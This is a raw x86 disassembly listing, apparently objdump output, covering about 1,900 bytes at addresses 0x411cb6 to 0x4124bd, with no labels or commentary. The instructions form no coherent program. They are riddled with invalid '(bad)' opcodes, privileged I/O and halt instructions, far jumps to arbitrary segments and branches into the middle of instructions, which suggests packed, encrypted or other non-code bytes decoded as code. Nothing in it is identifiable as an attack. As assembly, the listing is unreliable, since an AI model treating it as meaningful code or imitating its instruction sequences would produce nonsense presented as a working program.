  411cb6:	mov    ds:0x771c5040,eax
  411cbb:	call   0x4051:0x427bf53f
  411cc2:	push   0x8ffcb991
  411cc7:	add    al,BYTE PTR [edx-0x61]
  411cca:	jmp    0x42c4d1ed
  411ccf:	add    ah,cl
  411cd1:	jecxz  0x411ccf
  411cd3:	imul   esi,edi,0x27
  411cd6:	push   ds
  411cd7:	je     0x411c6b
  411cd9:	mov    ebp,0x1d0cb70e
  411cde:	call   0xa7a25ac4
  411ce3:	sbb    eax,0x3bd95fab
  411ce8:	and    esp,DWORD PTR [edx+0x1950eac4]
  411cee:	and    bh,ah
  411cf0:	fbld   TBYTE PTR [edx+0x1a]
  411cf3:	mov    eax,0xf6a682ce
  411cf8:	stos   DWORD PTR es:[edi],eax
  411cf9:	dec    ecx
  411cfa:	mov    eax,0xe35cd796
  411cff:	jmp    0x818c95d
  411d04:	push   ebp
  411d05:	inc    edi
  411d06:	loopne 0x411ce7
  411d08:	icebp  
  411d09:	popa   
  411d0a:	ss add al,0x6c
  411d0d:	mov    esi,DWORD PTR [ebx]
  411d0f:	ins    DWORD PTR es:[edi],dx
  411d10:	cmp    cl,bh
  411d12:	ds and eax,0x4f2843c3
  411d18:	push   esi
  411d19:	dec    ebp
  411d1a:	adc    ebx,DWORD PTR [eax+0x607ef49]
  411d20:	ret    
  411d21:	pusha  
  411d22:	(bad)  
  411d23:	popf   
  411d24:	and    eax,eax
  411d26:	inc    ecx
  411d27:	je     0x411d50
  411d29:	sbb    BYTE PTR [edi-0x73],ch
  411d2c:	pop    esp
  411d2d:	mov    eax,0x3fdca37
  411d32:	sbb    dh,BYTE PTR [edx]
  411d34:	repz inc eax
  411d36:	cmp    al,dh
  411d38:	cmc    
  411d39:	int3   
  411d3a:	inc    ebp
  411d3b:	in     al,0x23
  411d3d:	(bad)  
  411d3e:	out    dx,al
  411d3f:	retf   0x47e0
  411d42:	mov    esp,0xb16fca68
  411d47:	inc    edx
  411d48:	rcl    BYTE PTR [ebp-0x66dd2e8b],0xa6
  411d4f:	js     0x411d3b
  411d51:	imul   esi,DWORD PTR [ebp+0x2f],0x9865ccf9
  411d58:	xor    BYTE PTR [edi+ecx*8+0x63048157],0xbd
  411d60:	data16 xor BYTE PTR cs:[esi],ch
  411d64:	cld    
  411d65:	cmp    BYTE PTR [eax+0x50],dh
  411d68:	jle    0x411d2c
  411d6a:	es scas eax,DWORD PTR es:[edi]
  411d6c:	push   esi
  411d6d:	mov    ds:0xdf045d24,eax
  411d72:	ret    
  411d73:	xor    ebp,DWORD PTR [edx]
  411d75:	and    DWORD PTR [ebp+0x32],0xfffffff5
  411d79:	pop    eax
  411d7a:	fnstcw WORD PTR [edi+0x7cf5a3e3]
  411d80:	inc    esp
  411d81:	dec    edi
  411d82:	cmp    al,0xeb
  411d84:	clc    
  411d85:	cmp    eax,0x2cfbd4cd
  411d8a:	jno    0x411d37
  411d8c:	push   ds
  411d8d:	cmp    ch,BYTE PTR [esi-0x3ce908b3]
  411d93:	xchg   ecx,eax
  411d94:	adc    edi,ebp
  411d96:	stos   DWORD PTR es:[edi],eax
  411d97:	pop    es
  411d98:	int    0x9d
  411d9a:	sub    ebx,DWORD PTR [ecx+0x7a]
  411d9d:	idiv   DWORD PTR [eax+0x4c401eba]
  411da3:	mov    esi,0x1c67a1db
  411da8:	mov    dh,BYTE PTR [ebx+ebx*1-0x74f0059]
  411daf:	and    ch,0xc4
  411db2:	ret    
  411db3:	push   edx
  411db4:	mov    ebp,0x42b4ae5b
  411db9:	call   0x51d6:0x8f188bcb
  411dc0:	aam    0xa4
  411dc2:	not    BYTE PTR [edx]
  411dc4:	lea    edi,[ebx]
  411dc6:	inc    DWORD PTR [ebx+0x2f]
  411dc9:	sbb    ah,BYTE PTR [edi+0x6cd53866]
  411dcf:	or     eax,0x12e48f7f
  411dd4:	pop    esi
  411dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dd6:	and    BYTE PTR [esi-0x685e998],al
  411ddc:	pushf  
  411ddd:	dec    esp
  411dde:	jmp    0x35b5:0xe8f4c29e
  411de5:	add    ecx,edx
  411de7:	xchg   edi,eax
  411de8:	sar    DWORD PTR [edx],1
  411dea:	mov    ebx,0x55794c78
  411def:	xchg   DWORD PTR [edx-0x60],ecx
  411df2:	xor    DWORD PTR [edx],esp
  411df4:	mov    DWORD PTR [eax+0x12],edi
  411df7:	sub    al,0xc7
  411df9:	mov    ebp,0xa27a6f71
  411dfe:	push   0x27
  411e00:	dec    ebp
  411e01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e02:	jno    0x411dcd
  411e04:	ja     0x411db7
  411e06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e07:	and    eax,0x412e9cc3
  411e0c:	fdivr  QWORD PTR [edi+0x4e]
  411e0f:	sub    edi,DWORD PTR es:[edi-0x1983fae2]
  411e16:	popa   
  411e17:	sbb    ch,BYTE PTR [ecx+0x6d]
  411e1a:	call   0x12a62e8
  411e1f:	inc    BYTE PTR [eax]
  411e21:	scas   al,BYTE PTR es:[edi]
  411e22:	sbb    BYTE PTR [ebx],cl
  411e24:	in     al,0xeb
  411e26:	pop    esp
  411e27:	adc    eax,0xcac9ed3c
  411e2c:	sub    ah,BYTE PTR [esi]
  411e2e:	mov    eax,DWORD PTR [esi+0xd29824b]
  411e34:	jmp    0x7473:0xebec346b
  411e3b:	xchg   esi,eax
  411e3c:	loop   0x411e15
  411e3e:	mov    bh,0xe5
  411e40:	mov    eax,0xe1ff035e
  411e45:	xchg   esi,eax
  411e46:	shl    DWORD PTR [edx-0x47],0x34
  411e4a:	adc    BYTE PTR [ebx+0x379b98dc],ah
  411e50:	retf   
  411e51:	nop
  411e52:	pop    ds
  411e53:	sub    BYTE PTR [ebx+0x52340483],al
  411e59:	xor    al,0x94
  411e5b:	inc    eax
  411e5c:	loopne 0x411df4
  411e5e:	scas   eax,DWORD PTR es:[edi]
  411e5f:	shl    DWORD PTR [ecx-0x213b4ce9],0x8d
  411e66:	ss loop 0x411eb0
  411e69:	mov    ds:0x3525ad70,eax
  411e6e:	jo     0x411e4f
  411e70:	mov    eax,0xc8e0f55c
  411e75:	inc    esp
  411e76:	pop    edi
  411e77:	loop   0x411eea
  411e79:	test   al,0x33
  411e7b:	call   0x144d6ecd
  411e80:	dec    ebx
  411e81:	jbe    0x411e12
  411e83:	test   eax,0xd044bb9e
  411e88:	test   al,0xad
  411e8a:	stos   BYTE PTR es:[edi],al
  411e8b:	fcmovbe st,st(6)
  411e8d:	pop    esi
  411e8e:	add    BYTE PTR [ecx*2-0x705698e9],bl
  411e95:	sbb    eax,0x862b99af
  411e9a:	and    dl,bl
  411e9c:	sub    al,0xb0
  411e9e:	aam    0x61
  411ea0:	jge    0x411f0b
  411ea2:	pop    edx
  411ea3:	test   ecx,ecx
  411ea5:	pop    es
  411ea6:	dec    esp
  411ea7:	outs   dx,DWORD PTR ds:[esi]
  411ea8:	test   al,0x9c
  411eaa:	pop    ebx
  411eab:	push   ecx
  411eac:	add    DWORD PTR [ecx+ecx*4-0x4f],0x42620628
  411eb4:	push   esp
  411eb5:	scas   eax,DWORD PTR es:[edi]
  411eb6:	out    dx,eax
  411eb7:	in     al,dx
  411eb8:	in     al,dx
  411eb9:	xchg   edx,eax
  411eba:	or     eax,0x3d8bbd82
  411ebf:	mov    bl,0xb5
  411ec1:	bound  esi,QWORD PTR [edi]
  411ec3:	les    ebp,FWORD PTR [edi+0x81ec669]
  411ec9:	mov    edi,0x2ef713f5
  411ece:	test   DWORD PTR [ebx+edi*1],edi
  411ed1:	fcomp  QWORD PTR [eax-0x505cd2d9]
  411ed7:	pop    esi
  411ed8:	dec    ebx
  411ed9:	dec    ebx
  411eda:	jne    0x411f33
  411edc:	and    eax,0xfe7f3b72
  411ee1:	or     ebp,DWORD PTR [ebx]
  411ee3:	or     BYTE PTR [esi],ch
  411ee5:	lock sbb dl,BYTE PTR [esi]
  411ee8:	je     0x411f09
  411eea:	imul   ebp,DWORD PTR [ecx],0x37
  411eed:	fbstp  TBYTE PTR [ebp+0x23]
  411ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ef1:	push   cs
  411ef2:	ss mov esi,0x93d479f2
  411ef8:	jecxz  0x411ec6
  411efa:	jle    0x411e8c
  411efc:	scas   al,BYTE PTR es:[edi]
  411efd:	jb     0x411eac
  411eff:	jmp    0x411eb0
  411f01:	xchg   edi,eax
  411f02:	(bad)  
  411f04:	add    ebp,0x8036da03
  411f0a:	popf   
  411f0b:	aad    0x19
  411f0d:	jl     0x411ef0
  411f0f:	xor    DWORD PTR [edx+eax*2],ebp
  411f12:	outs   dx,DWORD PTR ds:[esi]
  411f13:	dec    esp
  411f14:	(bad)  
  411f15:	and    al,0x37
  411f17:	imul   BYTE PTR [edi]
  411f19:	aad    0x72
  411f1b:	iret   
  411f1c:	in     eax,dx
  411f1d:	in     al,0x76
  411f1f:	das    
  411f20:	(bad)  
  411f21:	gs or  eax,0xa81e7ea
  411f27:	sub    DWORD PTR [esi+0x14],0x77
  411f2b:	lock arpl WORD PTR [eax+edi*8-0x3c],sp
  411f30:	test   eax,0x18334d0b
  411f35:	mov    ebp,0x2d97c0c8
  411f3a:	mov    ebx,esp
  411f3c:	cld    
  411f3d:	ret    0x71d4
  411f40:	mov    dl,0x5e
  411f42:	sub    dl,BYTE PTR [ecx+0x44]
  411f45:	mov    ebx,0x78a7b99b
  411f4a:	xchg   esp,eax
  411f4b:	scas   al,BYTE PTR es:[edi]
  411f4c:	test   DWORD PTR [ebp-0x3a],eax
  411f4f:	fistp  DWORD PTR [ebx]
  411f51:	pop    ebp
  411f52:	adc    eax,0x666e639e
  411f57:	mov    WORD PTR [edx],gs
  411f59:	jbe    0x411f34
  411f5b:	pusha  
  411f5c:	and    al,0xb1
  411f5e:	shl    ebx,1
  411f60:	jae    0x411fc3
  411f62:	xor    ah,dh
  411f64:	or     DWORD PTR [ebx+ecx*2],ecx
  411f67:	jp     0x411eee
  411f69:	cld    
  411f6a:	cld    
  411f6b:	mov    al,ds:0xba0f601b
  411f70:	adc    cl,BYTE PTR [edx-0x23]
  411f73:	out    dx,eax
  411f74:	fcom   QWORD PTR [edx-0x52]
  411f77:	clc    
  411f78:	sbb    bh,bh
  411f7a:	(bad)  
  411f7b:	jmp    0x3ead:0x4abf2376
  411f82:	pop    eax
  411f83:	popf   
  411f84:	xchg   edi,eax
  411f85:	push   cs
  411f86:	retf   0x934e
  411f89:	xchg   BYTE PTR ds:0xbfce5ef5,ah
  411f8f:	xor    eax,0xf51007d6
  411f94:	mov    ecx,DWORD PTR es:[ebx-0x58]
  411f98:	sbb    eax,0x164ab9dc
  411f9d:	jle    0x411f67
  411f9f:	sbb    BYTE PTR [esp+ebp*1+0x7a4bcf0e],al
  411fa6:	call   0x75ab48f5
  411fab:	mov    al,0x73
  411fad:	sub    edi,DWORD PTR ds:0x52750c8
  411fb3:	and    BYTE PTR [esp+edi*8+0x20],bl
  411fb7:	sub    bh,BYTE PTR [eax+ebx*8]
  411fba:	pop    es
  411fbb:	aaa    
  411fbc:	inc    esp
  411fbd:	rcl    DWORD PTR [ebp+0x13],1
  411fc0:	adc    BYTE PTR [esi+0x19cc49b],0x27
  411fc7:	imul   esi,edx,0x1ffd0e08
  411fcd:	mul    BYTE PTR [eax+0x73]
  411fd0:	test   DWORD PTR [ecx-0x2d],esi
  411fd3:	(bad)  
  411fd4:	dec    ebx
  411fd5:	mov    ds:0x619315dd,al
  411fda:	sub    al,0xa7
  411fdc:	jle    0x412025
  411fde:	push   0x7d
  411fe0:	and    ebp,esp
  411fe2:	xor    eax,0xedefb836
  411fe7:	add    ch,dl
  411fe9:	inc    eax
  411fea:	jns    0x411f81
  411fec:	push   edi
  411fed:	lods   eax,DWORD PTR ds:[esi]
  411fee:	cmc    
  411fef:	js     0x411fa3
  411ff1:	test   al,0xc5
  411ff3:	enter  0x8ba7,0xb7
  411ff7:	sub    al,0x61
  411ff9:	imul   edx,DWORD PTR [eax-0x79],0x31b21f4b
  412000:	and    DWORD PTR [ecx+0x4ca6a0d8],ebx
  412006:	lahf   
  412007:	add    DWORD PTR [ebx+0x13850c31],ecx
  41200d:	jb     0x411fda
  41200f:	(bad)  
  412010:	push   ebp
  412011:	push   cs
  412012:	adc    BYTE PTR [ebx-0x7b],bl
  412015:	stc    
  412016:	pop    eax
  412017:	or     ah,BYTE PTR [edx+0x5ea6e0af]
  41201d:	push   edx
  41201e:	aam    0x49
  412020:	pop    esp
  412021:	das    
  412022:	mov    eax,0xd958bf9
  412027:	sbb    eax,0xc5102727
  41202c:	ins    DWORD PTR es:[edi],dx
  41202d:	jle    0x412000
  41202f:	sti    
  412030:	fst    DWORD PTR [edi-0x62ffd89]
  412036:	mov    ecx,0xed630215
  41203b:	sub    BYTE PTR [esi-0x6e],ch
  41203e:	add    DWORD PTR [ebp+0x7621db7],ebp
  412044:	inc    ebp
  412045:	outs   dx,BYTE PTR ds:[esi]
  412046:	push   0xb8c1f023
  41204b:	loop   0x411fe4
  41204d:	repz dec edi
  41204f:	test   dl,bl
  412051:	push   0xffffff8b
  412053:	imul   eax,DWORD PTR [esi],0x1d5d84c6
  412059:	sub    eax,0x232dc075
  41205e:	test   BYTE PTR [esi-0x2a],bl
  412061:	leave  
  412062:	xchg   esp,eax
  412063:	jmp    0x4120cb
  412065:	pop    ecx
  412066:	sti    
  412067:	mov    eax,0xab2756c0
  41206c:	sbb    eax,0x16946d2a
  412071:	fisubr WORD PTR [ebx]
  412073:	cmp    eax,0x2b3690ff
  412078:	bound  edx,QWORD PTR [eax]
  41207a:	stc    
  41207b:	cwde   
  41207c:	mov    ebx,0xea6a6835
  412081:	mov    bl,0x6d
  412083:	jb     0x412014
  412085:	popf   
  412086:	and    ch,BYTE PTR [ebx]
  412088:	lods   eax,DWORD PTR ds:[esi]
  412089:	xor    DWORD PTR [esi+0x4c],edi
  41208c:	in     al,dx
  41208d:	jno    0x41206b
  41208f:	xchg   esi,eax
  412090:	aaa    
  412091:	sub    eax,0xb188c358
  412096:	je     0x4120d5
  412098:	inc    esp
  412099:	cmc    
  41209a:	test   DWORD PTR [ecx-0x5b],0x48699c88
  4120a1:	jae    0x412025
  4120a3:	cmp    DWORD PTR ds:0xec6ad815,0xffffff8e
  4120aa:	(bad)
  4120ad:	ins    DWORD PTR es:[edi],dx
  4120ae:	cli    
  4120af:	pop    ebx
  4120b0:	cmp    DWORD PTR [edi+0x61],0x679676ce
  4120b7:	out    0x14,al
  4120b9:	lds    eax,FWORD PTR [ebp-0x3b]
  4120bc:	cmp    cl,BYTE PTR [eax-0x5b743169]
  4120c2:	loopne 0x41210d
  4120c4:	call   0x7afaee6c
  4120c9:	addr16 dec ebx
  4120cb:	in     al,0x61
  4120cd:	pop    esp
  4120ce:	loop   0x41205d
  4120d0:	xchg   esp,eax
  4120d1:	aam    0x13
  4120d3:	sub    bh,BYTE PTR [edi-0x53]
  4120d6:	or     DWORD PTR [ecx-0x39ab487b],ebp
  4120dc:	push   0x72
  4120de:	test   al,0x5f
  4120e0:	adc    edx,DWORD PTR ds:0x4cc2374e
  4120e6:	inc    ebp
  4120e7:	push   ss
  4120e8:	xor    ecx,DWORD PTR [ecx+0x60bbdc8e]
  4120ee:	mov    ecx,0x86a8049c
  4120f3:	jle    0x41207c
  4120f5:	mov    WORD PTR [ecx],ds
  4120f7:	jo     0x4120ff
  4120f9:	je     0x4120ae
  4120fb:	mov    bl,0xe2
  4120fd:	inc    eax
  4120fe:	or     al,0x9d
  412100:	pop    ds
  412101:	adc    eax,0x30f006e
  412106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412107:	aad    0xa1
  412109:	jle    0x4120e7
  41210b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41210c:	jne    0x4120d6
  41210e:	das    
  41210f:	shr    BYTE PTR [eax],cl
  412111:	retf   
  412112:	js     0x412126
  412114:	retf   0x802d
  412117:	cwde   
  412118:	pusha  
  412119:	aam    0xe1
  41211b:	pop    ebp
  41211c:	out    dx,eax
  41211d:	and    eax,0x72e7cf03
  412122:	xlat   BYTE PTR ds:[ebx]
  412123:	movd   DWORD PTR [ebx],mm0
  412126:	loopne 0x412103
  412128:	xor    eax,0xa096be3b
  41212d:	push   0x5a
  41212f:	out    0xd7,al
  412131:	(bad)  
  412132:	cmp    eax,0x86617810
  412137:	add    al,0x10
  412139:	inc    ecx
  41213a:	fadd   st,st(4)
  41213c:	xchg   DWORD PTR [esi-0x49f555ab],esp
  412142:	icebp  
  412143:	shr    DWORD PTR [eax],1
  412145:	arpl   WORD PTR [edx+ebp*1],di
  412148:	pop    ebp
  412149:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41214b:	add    DWORD PTR [edx-0x7cf34aae],edi
  412151:	mov    esi,0xc917f880
  412156:	mov    ds:0x935c0e7a,al
  41215b:	add    BYTE PTR [edi-0x8c48f97],dh
  412161:	test   DWORD PTR [edi+0x7d75ffed],ebp
  412167:	mov    dh,0x73
  412169:	out    0xd4,al
  41216b:	test   al,0x29
  41216d:	je     0x412113
  41216f:	add    al,0x13
  412171:	cdq    
  412172:	inc    eax
  412173:	loope  0x412139
  412175:	out    0x7e,eax
  412177:	mov    al,ds:0x1b4934fe
  41217c:	adc    BYTE PTR [ecx-0x3da81fc0],cl
  412182:	les    esp,FWORD PTR [edx+eiz*4-0x2f]
  412186:	push   0x1b7406ff
  41218b:	adc    al,0x9a
  41218d:	enter  0x773e,0xc3
  412191:	nop
  412192:	mov    bh,0x1d
  412194:	stos   BYTE PTR es:[edi],al
  412195:	jnp    0x4121f8
  412197:	lods   eax,DWORD PTR ds:[esi]
  412198:	fld    st(6)
  41219a:	sub    bh,BYTE PTR [eax-0x495dbf8d]
  4121a0:	fcomp  DWORD PTR [esp+edx*4-0x63]
  4121a4:	push   edx
  4121a5:	push   0x3179506c
  4121aa:	into   
  4121ab:	popa   
  4121ac:	jb     0x4121c8
  4121ae:	push   edi
  4121af:	push   edi
  4121b0:	mov    ss,WORD PTR [eax+esi*8-0x1e]
  4121b4:	out    dx,al
  4121b5:	mov    edi,0x64243e44
  4121ba:	(bad)  
  4121bc:	pop    ss
  4121bd:	fmul   DWORD PTR [edx+0x53fc7ab4]
  4121c3:	or     al,0xe0
  4121c5:	xor    eax,0xa211df14
  4121ca:	aaa    
  4121cb:	int3   
  4121cc:	mov    cl,0xd3
  4121ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121cf:	add    al,0x2c
  4121d1:	jmp    0x6b6b:0xaf63a41f
  4121d8:	hlt    
  4121d9:	and    eax,0x426d67ae
  4121de:	dec    ecx
  4121df:	inc    ecx
  4121e0:	sub    edi,DWORD PTR [eax-0x1c5f3b52]
  4121e6:	sub    DWORD PTR [edi-0x38c9e8a0],ecx
  4121ec:	sub    eax,0xad862021
  4121f1:	aas    
  4121f2:	ss jp  0x412179
  4121f5:	sbb    BYTE PTR [ecx+ecx*2-0x3b],cl
  4121f9:	(bad)  
  4121fa:	retf   0x235f
  4121fd:	or     eax,0x76ef6452
  412202:	fld    TBYTE PTR [edx]
  412204:	fisub  WORD PTR [edx]
  412206:	lahf   
  412207:	adc    BYTE PTR [edi-0x4e],al
  41220a:	mov    ch,0x62
  41220c:	xchg   ebp,eax
  41220d:	(bad)  
  41220e:	stc    
  41220f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412210:	cmp    al,0x3d
  412212:	repz lahf 
  412214:	jo     0x4121b6
  412216:	sbb    DWORD PTR [esi-0x7f07d9fd],eax
  41221c:	sbb    esp,DWORD PTR [esi+0x5a592620]
  412222:	jecxz  0x4121ce
  412224:	and    esp,DWORD PTR [esi]
  412226:	test   ebp,eax
  412228:	das    
  412229:	dec    edx
  41222a:	cld    
  41222b:	mov    ecx,0x97ac747d
  412230:	adc    BYTE PTR [ebp-0x12],al
  412233:	and    al,0xb4
  412235:	cmp    dl,BYTE PTR [eax-0x57137c0c]
  41223b:	or     eax,DWORD PTR [eax+0x2b320435]
  412241:	pop    edi
  412242:	add    ebx,edi
  412244:	xor    dh,bl
  412246:	cli    
  412247:	mov    ah,0x1e
  412249:	jl     0x412275
  41224b:	push   ds
  41224c:	inc    esi
  41224d:	or     eax,0x82df8f99
  412252:	pop    ebx
  412254:	mov    cl,0xbe
  412256:	leave  
  412257:	push   ds
  412258:	pop    ds
  412259:	cmp    DWORD PTR [ebx+0x1342c],esi
  41225f:	and    al,0xec
  412261:	dec    esp
  412262:	or     BYTE PTR ss:[edx],dh
  412265:	xchg   esi,eax
  412266:	jnp    0x41222a
  412268:	ds push ebp
  41226a:	sbb    al,0xfe
  41226c:	lock aas 
  41226e:	shr    dl,cl
  412270:	xlat   BYTE PTR ds:[ebx]
  412271:	jmp    0x8043:0x13af97cd
  412278:	in     eax,dx
  412279:	push   edx
  41227a:	lea    eax,[ecx+0x5e]
  41227d:	enter  0x562f,0x9e
  412281:	imul   ebx,DWORD PTR [ebx-0x10],0x1c
  412285:	add    bh,ch
  412287:	add    dl,BYTE PTR [ecx+0x3804b9f4]
  41228d:	dec    ecx
  41228f:	or     al,0x21
  412291:	adc    eax,edx
  412293:	jbe    0x4122f1
  412295:	(bad)  
  412296:	jecxz  0x4122e1
  412298:	and    edx,ecx
  41229a:	push   0xbe19deeb
  41229f:	and    al,0x8f
  4122a1:	add    BYTE PTR [ebx+ebx*4],ah
  4122a4:	leave  
  4122a5:	fadd   QWORD PTR [esi+ecx*8]
  4122a8:	popf   
  4122a9:	(bad)  
  4122aa:	jge    0x4122c4
  4122ac:	mov    edi,0xd5ea13e
  4122b1:	add    eax,0xee94fa8a
  4122b6:	jl     0x412323
  4122b8:	pop    esp
  4122b9:	dec    ebp
  4122ba:	into   
  4122bb:	out    0xc4,al
  4122bd:	shr    edi,0xd1
  4122c0:	in     al,0x65
  4122c2:	cs pushf 
  4122c4:	fwait
  4122c5:	inc    ebp
  4122c6:	bnd jmp 0x4122b0
  4122c9:	int3   
  4122ca:	aaa    
  4122cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122cc:	fs clc 
  4122ce:	pop    esp
  4122cf:	push   edi
  4122d0:	repz pop esi
  4122d2:	add    eax,0xf628f994
  4122d7:	int3   
  4122d8:	pusha  
  4122d9:	ret    
  4122da:	mov    bh,0x6f
  4122dc:	jg     0x4122b9
  4122de:	popf   
  4122df:	(bad)  
  4122e0:	sub    al,0x61
  4122e2:	pop    ds
  4122e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e4:	and    al,BYTE PTR [ebx+0x1c]
  4122e7:	es icebp 
  4122e9:	shl    BYTE PTR [edx],0xcc
  4122ec:	or     BYTE PTR [edi+esi*2-0x7a],bh
  4122f0:	mov    edx,0xc2414fd5
  4122f5:	push   ebp
  4122f6:	cmp    DWORD PTR [edx+edi*2],0x3
  4122fa:	sbb    eax,0xc3873a58
  4122ff:	int    0xe1
  412301:	sbb    al,0xff
  412303:	push   esi
  412304:	push   esi
  412305:	fnsave [esi]
  412307:	popf   
  412308:	sub    al,0x3b
  41230a:	push   0xbc535c1a
  41230f:	lds    esp,FWORD PTR [esi]
  412311:	sahf   
  412312:	or     edx,DWORD PTR [ebx-0x4f]
  412315:	rcr    DWORD PTR ds:0x5a65fdc4,1
  41231b:	int3   
  41231c:	mov    bl,0xe4
  41231e:	sbb    DWORD PTR [esi+0x14d1e833],eax
  412324:	jecxz  0x4122ff
  412326:	dec    ecx
  412327:	mov    bl,0x7e
  412329:	jle    0x412349
  41232b:	dec    ebp
  41232c:	sub    al,0x40
  41232e:	adc    eax,0xf7d6f44b
  412333:	xchg   ebx,eax
  412334:	aam    0xfe
  412336:	sbb    eax,0x8ece15c1
  41233b:	dec    esi
  41233c:	hlt    
  41233d:	inc    ebx
  41233e:	cli    
  41233f:	test   BYTE PTR [edi+0x701852ce],bl
  412345:	xlat   BYTE PTR ds:[ebx]
  412346:	cmc    
  412347:	dec    esp
  412348:	and    DWORD PTR [ecx+0x20be8b59],ebp
  41234e:	jge    0x41235d
  412350:	aad    0x4e
  412352:	add    eax,0x7672c740
  412357:	mov    esi,0x76a7082e
  41235c:	add    DWORD PTR ds:0x9641a450,ecx
  412362:	hlt    
  412363:	dec    edi
  412364:	push   ds
  412365:	mov    dl,0xb7
  412367:	sbb    DWORD PTR [esi+0x56f6799a],esi
  41236d:	pop    eax
  41236e:	sub    BYTE PTR [eax],bh
  412370:	jecxz  0x41239e
  412372:	lods   al,BYTE PTR ds:[esi]
  412373:	jnp    0x4123c6
  412375:	out    0x8,eax
  412377:	xor    ebx,eax
  412379:	mov    DWORD PTR [esi],esp
  41237b:	and    DWORD PTR [esi+0x48f6573f],eax
  412381:	mov    ecx,0x9715fd3f
  412386:	ret    
  412387:	aad    0x2e
  412389:	shl    BYTE PTR [ecx-0x71],0xd8
  41238d:	inc    edx
  41238e:	mov    al,0x55
  412390:	hlt    
  412391:	(bad)  
  412392:	mov    eax,0x784fa18b
  412397:	mov    dh,0xf6
  412399:	sub    al,0xc4
  41239b:	cmp    DWORD PTR [esi],edx
  41239d:	aas    
  41239e:	xor    BYTE PTR [edx-0x5d],0x3f
  4123a2:	cmp    BYTE PTR [ebx+0x476727b6],al
  4123a8:	xchg   DWORD PTR [esi+0x4ebc5f5d],esp
  4123ae:	pop    ecx
  4123af:	sbb    ebp,DWORD PTR [edx+0x363dd773]
  4123b5:	rcl    DWORD PTR [eax-0x61],cl
  4123b8:	xchg   ebp,eax
  4123b9:	mov    edi,0x36aebd5a
  4123be:	outs   dx,DWORD PTR ds:[esi]
  4123bf:	fisttp DWORD PTR cs:[ebp+eax*4+0x468ce61d]
  4123c7:	enter  0x9a9d,0x90
  4123cb:	stos   DWORD PTR es:[edi],eax
  4123cc:	or     al,0xda
  4123ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123cf:	inc    esi
  4123d0:	repz inc ah
  4123d3:	int3   
  4123d4:	mov    dl,bh
  4123d6:	inc    ebp
  4123d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d8:	sbb    eax,0x61346a7e
  4123dd:	dec    esi
  4123de:	adc    eax,0x44e1fa1a
  4123e3:	push   esp
  4123e4:	adc    esp,DWORD PTR [ebp-0x72d309d7]
  4123ea:	cmp    edx,DWORD PTR [eax]
  4123ec:	cmp    al,0xfd
  4123ee:	jno    0x412383
  4123f0:	sti    
  4123f1:	jmp    0x41241b
  4123f3:	add    esp,DWORD PTR [esi+0x4f2db168]
  4123f9:	pop    esp
  4123fa:	and    eax,0xe34d81cf
  4123ff:	in     eax,0x27
  412401:	iret   
  412402:	mov    cl,0xe7
  412404:	cwde   
  412405:	xchg   edi,ecx
  412407:	jae    0x412476
  412409:	jo     0x412488
  41240b:	jnp    0x412397
  41240d:	sub    esp,DWORD PTR [eax-0x48]
  412410:	adc    ecx,esp
  412412:	pop    esp
  412413:	sub    al,ch
  412415:	int3   
  412416:	inc    ecx
  412417:	mov    ch,0xa8
  412419:	push   ebp
  41241a:	jecxz  0x412459
  41241c:	xchg   edi,eax
  41241d:	add    BYTE PTR [eax],dl
  41241f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412420:	mov    ebx,0xc059295c
  412425:	mov    ds:0xf47363fb,eax
  41242a:	ins    BYTE PTR es:[edi],dx
  41242b:	inc    esi
  41242c:	sbb    DWORD PTR ds:[edx+0x6a],ebp
  412430:	add    eax,0xbd4d8c06
  412435:	into   
  412436:	jo     0x412453
  412438:	adc    BYTE PTR [edi+eax*8-0x30],0x30
  41243d:	aad    0x2e
  41243f:	jmp    0x4124a7
  412441:	int    0xc6
  412443:	fcom   DWORD PTR [eax+0x2d]
  412446:	test   al,0xa
  412448:	rol    dh,1
  41244a:	jo     0x4124bf
  41244c:	push   eax
  41244d:	xchg   edx,eax
  41244e:	mov    dh,0x2a
  412450:	jl     0x4124cb
  412452:	aaa    
  412453:	cmp    BYTE PTR [ebp+0xd],al
  412456:	inc    esi
  412457:	pop    edi
  412458:	xchg   edi,eax
  412459:	cmp    BYTE PTR [edx-0x477adfe3],cl
  41245f:	scas   al,BYTE PTR es:[edi]
  412460:	mov    WORD PTR [edi-0x57aa9b9d],ss
  412466:	jmp    0x92005d44
  41246b:	and    al,0x62
  41246d:	inc    ecx
  41246e:	aaa    
  41246f:	add    edi,DWORD PTR [ecx]
  412471:	mov    esi,DWORD PTR [ebp-0x5e]
  412474:	mov    al,0x0
  412476:	lock pushf 
  412478:	mov    al,0x32
  41247a:	sbb    ch,BYTE PTR [edi-0x3b]
  41247d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41247e:	mov    BYTE PTR ds:0x7b6ee0c0,dl
  412484:	gs mov ebp,0xbf15447f
  41248a:	xchg   esi,eax
  41248b:	lods   al,BYTE PTR ds:[esi]
  41248c:	dec    edi
  41248d:	push   eax
  41248e:	mov    dl,0x89
  412490:	popa   
  412491:	mov    ebx,ds
  412493:	sbb    eax,0xcd5be827
  412498:	jb     0x412481
  41249a:	jae    0x4124c9
  41249c:	inc    ebp
  41249d:	sub    eax,0x15d00665
  4124a2:	repnz inc esi
  4124a4:	mov    ebp,0xd6277813
  4124a9:	fwait
  4124aa:	imul   eax,DWORD PTR [esi+0x23a11a92],0x60
  4124b1:	fistp  WORD PTR [ecx-0x2f]
  4124b4:	push   ebx
  4124b5:	not    DWORD PTR [esi+edi*2+0x22]
  4124b9:	sbb    bh,BYTE PTR [esi+0x5b]
  4124bc:	scas   al,BYTE PTR es:[edi]
  4124bd:	mov    esi,0xa92ff28d
